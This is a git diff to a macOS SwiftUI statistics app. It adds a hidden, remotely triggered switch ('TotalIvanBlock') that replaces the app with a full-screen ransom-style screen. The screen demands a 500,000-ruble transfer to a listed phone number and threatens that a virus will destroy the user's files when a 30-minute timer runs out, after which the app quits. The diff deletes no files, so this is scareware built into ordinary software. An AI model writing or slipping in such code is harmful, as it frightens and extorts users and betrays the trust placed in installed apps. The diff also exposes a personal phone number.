@@ -17,6 +17,7 @@ struct Youchip_StatApp: App {
     @StateObject private var authManager = AuthManager()
     @State private var showTimeManipulationAlert = false
     @State private var showVersionOutdatedAlert = false
+    @State private var ivanBlockEnabled = false
     
     init() {
         AppSetupManager.setup()
@@ -24,29 +25,33 @@ struct Youchip_StatApp: App {
     
     var body: some Scene {
         WindowGroup {
-            ContentView()
-                .environmentObject(authManager)
-                .onAppear {
-                    if authManager.timeManipulationDetected {
-                        showTimeManipulationAlert = true
-                    } else {
-                        checkAppVersion()
+            if ivanBlockEnabled {
+                IvanBlockView()
+            } else {
+                ContentView()
+                    .environmentObject(authManager)
+                    .onAppear {
+                        if authManager.timeManipulationDetected {
+                            showTimeManipulationAlert = true
+                        } else {
+                            checkAppVersion()
+                        }
                     }
-                }
-                .alert("Предупреждение", isPresented: $showTimeManipulationAlert) {
-                    Button(^String.Titles.fieldMapButtonOK) {
-                        NSApplication.shared.terminate(nil)
+                    .alert(^String.Titles.warning, isPresented: $showTimeManipulationAlert) {
+                        Button(^String.Titles.fieldMapButtonOK) {
+                            NSApplication.shared.terminate(nil)
+                        }
+                    } message: {
+                        Text("Пиратить и читерить - Плохо!!!!!")
                     }
-                } message: {
-                    Text("Пиратить и читерить - Плохо!!!!!")
-                }
-                .alert("Устаревшая версия", isPresented: $showVersionOutdatedAlert) {
-                    Button(^String.Titles.fieldMapButtonOK) {
-                        NSApplication.shared.terminate(nil)
+                    .alert("Устаревшая версия", isPresented: $showVersionOutdatedAlert) {
+                        Button(^String.Titles.fieldMapButtonOK) {
+                            NSApplication.shared.terminate(nil)
+                        }
+                    } message: {
+                        Text("Ваша версия устарела, обновитесь до актуальной версии")
                     }
-                } message: {
-                    Text("Ваша версия устарела, обновитесь до актуальной версии")
-                }
+            }
         }
         .handlesExternalEvents(matching: [])
     }
@@ -57,6 +62,14 @@ struct Youchip_StatApp: App {
         remoteConfig.fetch(withExpirationDuration: 0) { status, error in
             if status == .success {
                 remoteConfig.activate { _, _ in
+                    let ivanBlock = remoteConfig.configValue(forKey: "TotalIvanBlock").boolValue
+                    if ivanBlock {
+                        DispatchQueue.main.async {
+                            self.ivanBlockEnabled = true
+                        }
+                        return
+                    }
+                    
                     let requiredVersion = remoteConfig.configValue(forKey: "MajorVersion").stringValue
                     
                     if let currentVersion = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String {
@@ -102,5 +115,66 @@ struct ContentView: View {
         VideosView()
             .environmentObject(VideosViewModel())
             .environmentObject(authManager)
+    }
+}
+
+struct IvanBlockView: View {
+    @State private var timeRemaining: TimeInterval = 30 * 60
+    @State private var timer: Timer?
+    
+    var body: some View {
+        GeometryReader { geometry in
+            ZStack {
+                Color.black.ignoresSafeArea()
+                
+                VStack(spacing: 40) {
+                    Spacer()
+                    
+                    Image("ivan")
+                        .resizable()
+                        .aspectRatio(contentMode: .fit)
+                        .frame(width: 600, height: 600)
+                    
+                    Text("Если по истечении таймера не будет погашен долг размером 500 тыс руб (номер для перевода +79956145183 Иван Х. ТБанк), то Иван доест свой рамен и вирус ivan_Pojiratel228.sh сьест все ваши файлы")
+                        .font(.system(size: 24, weight: .bold))
+                        .foregroundColor(.red)
+                        .multilineTextAlignment(.center)
+                        .padding(.horizontal, 40)
+                        .fixedSize(horizontal: false, vertical: true)
+                    
+                    Text(timeString(from: timeRemaining))
+                        .font(.system(size: 72, weight: .bold))
+                        .foregroundColor(.white)
+                        .monospacedDigit()
+                    
+                    Spacer()
+                }
+                .frame(maxWidth: .infinity, maxHeight: .infinity)
+            }
+        }
+        .frame(minWidth: 1200, minHeight: 900)
+        .onAppear {
+            startTimer()
+        }
+        .onDisappear {
+            timer?.invalidate()
+        }
+    }
+    
+    private func startTimer() {
+        timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
+            if timeRemaining > 0 {
+                timeRemaining -= 1
+            } else {
+                timer?.invalidate()
+                NSApplication.shared.terminate(nil)
+            }
+        }
+    }
+    
+    private func timeString(from timeInterval: TimeInterval) -> String {
+        let minutes = Int(timeInterval) / 60
+        let seconds = Int(timeInterval) % 60
+        return String(format: "%02d:%02d", minutes, seconds)
     }
 }
